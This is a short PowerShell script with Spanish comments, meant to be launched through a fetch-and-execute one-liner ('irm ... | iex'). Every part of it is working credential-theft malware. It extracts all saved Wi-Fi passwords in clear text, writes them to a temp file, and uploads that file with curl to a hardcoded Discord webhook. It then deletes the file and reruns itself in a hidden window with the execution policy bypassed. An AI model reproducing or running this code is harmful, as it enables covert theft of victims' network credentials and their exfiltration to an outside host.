# Ejecutar con: irm https://raw.githubusercontent.com/tuscript.txt | iex

$script = {
    $webhook = "https://discord.com/api/webhooks/1360605534838980780/BwDz68YsJ0nzDqi2eVFbZ6yWivXquWoUEIcc9hVBxBVLKiQnSGy8oDoccu2ctIy8HMtJ"
    $temp = "$env:TEMP\$env:USERNAME.log"
    
    # Obtener WiFi
    netsh wlan show profiles | Select-String ":\s(.+)$" | % {
        $ssid = $_.Matches.Groups[1].Value.Trim()
        $pass = (netsh wlan show profile name="$ssid" key=clear | Select-String "Contenido de la clave\s+:\s+(.+)").Matches.Groups[1].Value
        "[$ssid] : $pass" >> $temp
    }
    
    # Enviar y limpiar
    curl.exe -F "file1=@$temp" $webhook > $null
    del $temp -Force
}

# Ejecución invisible
Start-Process powershell.exe "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command $script" -WindowStyle Hidden
